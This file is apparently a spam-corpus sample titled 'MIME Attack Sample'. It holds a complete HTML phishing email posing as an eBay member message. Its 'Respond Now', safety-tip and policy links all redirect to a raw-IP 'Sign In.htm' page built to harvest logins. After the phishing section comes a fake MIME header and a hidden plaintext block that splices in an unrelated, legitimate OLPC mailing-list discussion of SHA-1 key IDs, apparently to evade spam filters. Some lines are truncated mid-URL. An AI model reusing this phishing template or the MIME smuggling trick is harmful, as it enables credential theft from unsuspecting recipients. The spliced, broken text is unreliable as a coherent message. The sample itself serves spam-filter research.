From: jwillis@wafs.com
To: scott.affelt@enron.com, vince.middleton@enron.com, mary.schoen@enron.com, 
Subject: MIME Attack Sample
Content-Type: text/html;
	charset="Windows-1251"
Content-Transfer-Encoding: 7bit
X-Priority: 1
X-MSMail-Priority: High
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
Message-Id: <20070522190725.508861C32A@lujan.uninet.edu>
To: undisclosed-recipients: ;
Status: O
X-Status: 
X-Keywords:                  
X-UID: 1302

<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
<TBODY>
<TR>
<TD width="1%"><IMG alt=eBay src="http://pics.ebaystatic.com/aw/pics/logos/ebay_95x39.gif" border=0></TD>
<TD vAlign=bottom><FONT face="verdana, sans-serif" color=#666666 size=1></FONT><BR></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffe680 border=0>
<TBODY>
<TR>
<TD vAlign=top width=8><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/globalAssets/ltCurve.gif" width=8></TD>
<TD vAlign=bottom width="100%">
<H1 style="MARGIN-TOP: 2px; FONT-WEIGHT: bold; FONT-SIZE: 14pt; MARGIN-BOTTOM: 2px; COLOR: rgb(0,0,0); FONT-FAMILY: arial"><FONT face="Arial, Verdana" size=4><B>Question from eBay Member -- Respond Now</B></FONT> </H1></TD>
<TD vAlign=top align=right width=8><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/globalAssets/rtCurve.gif" width=8 align=top></TD></TR>
<TR>
<TD bgColor=#ffcc00 colSpan=3 height=4><BR></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD>
<TD>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD>
<TABLE style="BORDER-RIGHT: rgb(255,204,0) 1px solid; BORDER-LEFT: rgb(255,204,0) 1px solid; BORDER-BOTTOM: rgb(255,204,0) 1px solid" width="100%" border=0>
<TBODY>
<TR>
<TD style="PADDING-LEFT: 8px"><FONT face="Arial, Verdana" size=2>eBay sent this message on behalf of an eBay member through My Messages. Responses sent using email will not reach the eBay member. </FONT></TD></TR></TBODY></TABLE></TD>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD>
<TD>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD colSpan=4><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
<TR>
<TD vAlign=top align=left width="100%">
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD><IMG src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD align=left>
<TABLE cellSpacing=0 cellPadding=1 width="100%" align=center bgColor=#e2e0e0 border=0>
<TBODY>
<TR bgColor=#eeeeee height=20>
<TD bgColor=#e2e0e0><SPAN class=SectionTitle><FONT face=arial>Question from 232patrick</FONT></SPAN></TD></TR>
<TR>
<TD>
<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#e0e0e0 border=0>
<TBODY>
<TR bgColor=#eeeeee>
<TD vAlign=top width="50%">
<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#eeeeee border=0>
<TBODY>
<TR>
<TD colSpan=3><IMG height=6 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
<TR>
<TD width=5><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD>
<TD colSpan=2><FONT face="Arial, Verdana" size=2><STRONG>Activity with</STRONG> <STRONG>232patrick</STRONG> (last 90 days):</FONT></TD></TR>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD colSpan=2><FONT face="Arial, Verdana" size=2>- I have bid on <B>0</B> items from 232patrick</FONT></TD></TR>
<TR>
<TD colSpan=3><IMG height=4 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></TD>
<TD bgColor=#9999cc><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD vAlign=top width="50%">
<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#eeeeee border=0>
<TBODY>
<TR>
<TD width=5><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD>
<TD colSpan=2><FONT face="Arial, Verdana" size=2><U><FONT color=#0000ff>232patrick</FONT></U><A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm"><FONT color=#0000cc></FONT></A></FONT></TD></TR>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD width="20%"><FONT face="Arial, Verdana" size=1>Positive feedback:</FONT></TD>
<TD><FONT face="Arial, Verdana" size=1>100%</FONT></TD></TR>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD width="20%"><FONT face="Arial, Verdana" size=1>Member since:</FONT></TD>
<TD><FONT face="Arial, Verdana" size=1>Feb-21-03</FONT></TD></TR>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD width="20%"><FONT face="Arial, Verdana" size=1>Location:</FONT></TD>
<TD><FONT face="Arial, Verdana" size=1><SPAN id=lw_1168100095_0 style="BORDER-BOTTOM: #0066cc 1px dashed"><SPAN id=lw_1168202861_0 style="BORDER-BOTTOM: #0066cc 1px dashed"><SPAN id=lw_1168738039_0 style="BORDER-BOTTOM: #0066cc 1px dashed">CA, United States</SPAN></SPAN></SPAN></FONT></TD></TR>
<TR>
<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
<TD width="20%"><FONT face="Arial, Verdana" size=1>Registered on:</FONT></TD>
<TD><FONT face="Arial, Verdana" size=1>www.ebay.com</FONT></TD></TR>
<TR>
<TD colSpan=3><IMG height=4 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD>
<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
<TBODY>
<TR bgColor=#ffffff>
<TD>
<TABLE cellSpacing=0 cellPadding=4>
<TBODY>
<TR>
<TD vAlign=top width="84%">
<P><FONT size=2>This is the last time I send the money in advance to people like you. It's been 4 weeks and no answer. You stole my daughter's birthday money you thief. This won't end like this I will contact eBay and Paypal and you'll go to jail.</FONT></P>
<P><FONT size=2>Curtis<FONT face="Arial, Verdana"></FONT></FONT></P></TD>
<TD vAlign=top align=right width=185>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD><B><FONT face="Arial, Verdana" size=2>Respond to this question</FONT></B></TD></TR>
<TR>
<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD></TR>
<TR>
<TD><A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm" target=_blank rel=nofollow><IMG height=32 alt="Respond Now" src="http://pics.ebaystatic.com/aw/pics/buttons/btnRespondNow.gif" width=120 border=0></A></TD></TR>
<TR>
<TD><IMG height=4 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
<TR>
<TD><I><FONT face="verdana, sans-serif" color=gray size=1>Responses in My Messages will not include your email address.</FONT></I></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=1 width="100%" border=0>
<TBODY>
<TR>
<TD bgColor=white height=10><BR></TD></TR>
<TR>
<TD bgColor=white><FONT face="Arial, Verdana" size=2>Thank you,<BR>eBay</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD>
<TD vAlign=top align=right width=188>
<TABLE cellSpacing=0 cellPadding=0 width=188 border=0>
<TBODY>
<TR>
<TD>
<TABLE style="BORDER-RIGHT: rgb(107,123,145) 1px solid; BORDER-TOP: rgb(107,123,145) 1px solid; BORDER-LEFT: rgb(107,123,145) 1px solid; WIDTH: 225px; BORDER-BOTTOM: rgb(107,123,145) 1px solid; HEIGHT: 514px" cellSpacing=0 cellPadding=0 border=0>
<TBODY>
<TR>
<TD>
<TABLE cellSpacing=0 cellPadding=0 border=0>
<TBODY>
<TR>
<TD>
<TABLE cellSpacing=0 cellPadding=0 border=0>
<TBODY>
<TR>
<TD bgColor=#cad2dd><IMG height=25 alt="Marketplace Safety Tip" src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgShield_25x25.gif" width=25 border=0></TD>
<TD bgColor=#cad2dd><FONT face="Arial, Helvetica, Verdana, sans-serif" size=-1><B><A style="COLOR: rgb(0,0,0); TEXT-DECORATION: none" href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm" target=_blank rel=nofollow>Marketplace Safety Tip</A></B></FONT> </TD>
<TD bgColor=#cad2dd><IMG title="" height=25 alt=" " src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif" width=25 border=0></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD>
<TABLE cellSpacing=0 cellPadding=5 border=0>
<TBODY>
<TR>
<TD><FONT face="Arial, Verdana" size=2>
<DIV><B>Do not respond to the sender (through the eBay system or your email provider) if this message is an offer to </B><A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm" ><FONT color=#003399>buy or sell an item</FONT></A>. This type of offer is against eBay policy, may be fraudulent, and is not covered by buyer protection programs.<BR><BR><B>Second Chance Offer emails with the subject of Message from eBay Member are fake</B>. Real <A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm ><FONT color=#003399>Second Chance Offers</FONT></A> come directly from eBay and appear in <A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWM
 Dc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1
<TR>
<TD bgColor=#c9d2dc height=5><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR>
<TR>
<TD></TD></TR></TBODY></TABLE></TD>
<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
<TR>
<TD width="100%" bgColor=#ffffff colSpan=4></TD></TR>
<TR>
<TD width="100%" bgColor=#cecee3 colSpan=4><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
<TR>
<TD width="100%" bgColor=#ffffff colSpan=4><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
<TR>
<TD colSpan=4>
<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
<TBODY>
<TR>
<TD><FONT face="Arial, Verdana" color=#666666 size=1>Learn how you can protect yourself from spoof (fake) emails at: <BR><A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm" target=_blank rel=nofollow><FONT color=#003399>http://pages.ebay.com/education/spooftutorial</FONT></A><BR><BR>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies. <BR>Privacy Policy: <A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3MDMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG=148vsd1jp/EXP=1138544186/**http://196.14.44.19/Sign%20In.htm" target=_blank rel=nofollow><FONT color=#003399>http://pages.ebay.com/help/policies/privacy-policy.html</FONT></A><BR>User Agreement: <A href="http://rds.yahoo.com/_ylt=A0LaSV66fNtDg.kAUoJXNyoA;_ylu=X3oDMTE2ZHVuZ3E3BGNvbG8DdwRsA1dTMQRwb3M
 DMwRzZWMDc3IEdnRpZANGNjU1Xzc1/SIG
Content-Type: text/html
<div style="display: none;"><plaintext>
Content-Type: text/plain
BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On Thu, 31 May 2007 at 10:45:02 +0200, Morgan Collett wrote:
> Simon McVittie wrote:
> > I'm assuming here that the key-ID is "sufficiently unique" across all
> > trusted servers. It's a SHA-1 of the public key, so basically the
> > same strength as GnuPG key fingerprints and git object hashes.
> > (Actually, for hysterical raisins, it's a SHA-1 of Base64(public_key) -
> > we should probably change this before we ship.)
> 
> A lot of crypto out there relies on hashes of keys. If the key is random
> (enough), then the hash should be good enough not to collide. At least,
> not in predictable ways...

Sure. If there's a collision, you may be able to do a minor DoS
by setting up two XOs with keys with the same key-ID - this will confuse
the PS on other XOs, but shouldn't be serious (the worst case is that
you can see that one or other of the colliding XOs is in an activity,
but you can't see which is there, or indeed whether it's both).

(Hmm, actually... in the current implementation, if one of the colliding XOs
is in an activity, and it leaves, then the PS (and hence UI) will
indicate that the "collided" Buddy has left, which may enable the other
colliding XO to eavesdrop undetected. I can fix this quite easily, though,
and will do so.)

Impersonating another child would require a preimage attack, as I understand it
(i.e. the ability to construct a key with a desired hash). It seems
reasonable that we don't defend against preimage attacks.

> Why though is it a hash of the base64? In theory the base64s have the
> same entropy as the keys, but the crypto stuff should be happening in
> binary land unless we get into XML.

Like I said, hysterical raisins (aka "it was like that when I got
here").

The public key is represented in Telepathy by a byte-array (i.e. binary
blob) and our assumption was always that the OLPC people would put raw
key material into it. However, the presence service always appears to
pass keys around as Base64 strings, which are the contents of owner.key.pub
(which is an OpenSSH DSA public key in the same form you'd put in your
~/.ssh/authorized_keys) minus the "ssh-dss " prefix.

I think the PS should pass keys around as a binary blob of raw key material,
and the SHA-1 should be over this raw key material.

> If changing it will break the mesh for everybody at some point "before
> we ship", sooner's better than later.

Agreed.

> In http://www.nist.gov/sha, NIST states:
> "Federal agencies should stop using SHA-1 for digital signatures,
> digital time stamping and other applications that require collision
> resistance as soon as practical, and must use the SHA-2 family of hash
> functions for these applications after 2010."
> 
> We probably won't have a NIST-blessed replacement for SHA before 2012.
> Nevertheless, we need to allow for changes along the way.

Hmm. I hadn't thought about having a changeable key algorithm...

> > The actual function used for the key-ID can be changed (if it
> > is, old and new versions of Sugar will be incompatible, but that's not
> > really a problem yet) so if any crypto gurus want to specify something
> > different, now would be a really good time. As currently implemented, its
> > output must be short enough to put in the JID (for which a hex SHA-1 is
> > somewhat long already).
> 
> IMO we need to allow for some algorithm agility here. Breaking the mesh
> at any stage is going to be very unpleasant - for the users^Wkids
> especially.
> 
> For the unique identifier stuff, could we at some future point do a
> 'keyid2/' (or some other prefix) meaning that this is an identifier in a
> different space?

OK, here's a proposal:

* The generated JIDs have a prefix ending with a dot, which is the algorithm
  by which they were generated.

* No prefix means hex(SHA-1(Base64(key material))) as we currently do.
  This is deprecated and support will be removed before we ship.

* We define a prefix to switch to now, perhaps "sha1." meaning
  hex(SHA1(key material)). We could consider switching from hex to Base32
  (which would give us JIDs half as long for the same hash length), or to a
  stronger hash algorithm, straight away. The Base32 pad character would have
  to be changed from "=" to "_" to be valid in both JIDs and object-paths, but
  that's easy. Base64 is unsuitable since the user part of a JID is
  case-insensitive.

* Everything else containing a dot is reserved for future expansion.

* The object ID inside PS is one of xmpp/some.jid@example.com (as
  currently, used for "foreign" and unidentifiable buddies),
  keyid/hexhexhexhex (for an unprefixed key, deprecated), or
  keyid/prefix/whateverwhatever (for a key with that prefix, e.g.
  keyid/sha1/hexhexhexhex).

* When coalescing contacts into buddy objects we assume the buddy will
  rarely be visible on more than one server at the same time with different
  key-hash algorithms, so continue to treat the key-hash as a unique ID.
  The failure mode if this assumption fails is that there might be two
  Buddy objects in the mesh representing the same person, but the PS as it
  exists at the moment will never cause this (it only ever connects to
  one server at a time), so I don't think we need to care.

* When we discover a buddy's full key, we hash it repeatedly, and add
  their Buddy object to the dict PresenceService._buddies once per known
  hash/encoding algorithm. Note that on Salut (link-local) we expect to either
  have someone's full key, or discover that they don't have a key, before we
  can interact with them at all.

* The server component that does the key-based authentication (which
  we haven't written yet) always has to be upgraded earlier than the XOs are,
  so it will let new XOs register with new hash/encoding algorithms.

* After the XO registers on the server, instead of storing a boolean
  "registered", it stores the JID it used. In future, it'll always log
  in with that JID.

* Should there be a process by which XOs whose JIDs use a weak hash try to
  upgrade to a better hash, by creating a new account? If so, we can avoid
  the "two Buddies" issue by making sure we log out of the old account
  before attempting to create the new one; if creation fails we can log
  back in as the old account.

* When looking up a buddy by complete public key, we try all
  non-obsolete hash/encoding algorithms (so there's value in keeping the
  number supported as small as possible).

Regards,
	Simon
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net

iD8DBQFGXt5fWSc8zVUw7HYRAsP0AKCRsVtq8agbG0Pqj4DKtAWCkZdv4ACg6rOM
sbC1C9sdGt4Nkz02HlF1om4=
=a1SH
-----END PGP SIGNATURE-----
_____